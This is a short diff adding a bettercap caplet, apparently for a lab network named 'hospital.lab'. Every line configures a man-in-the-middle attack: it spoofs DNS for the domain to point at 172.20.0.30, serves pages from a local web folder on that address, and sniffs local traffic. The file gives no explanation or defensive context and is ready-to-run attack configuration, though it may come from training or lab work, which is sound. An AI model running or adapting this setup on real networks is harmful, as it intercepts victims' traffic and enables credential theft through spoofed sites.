@@ -1,0 +1,10 @@
+set dns.spoof.domains hospital.lab
+set dns.spoof.address 172.20.0.30
+set dns.spoof.all true
+set http.server.address 172.20.0.30
+set http.server.path /root/caplets/www
+set net.sniff.local true
+set net.sniff.verbose false
+http.server on
+dns.spoof on
+net.sniff on
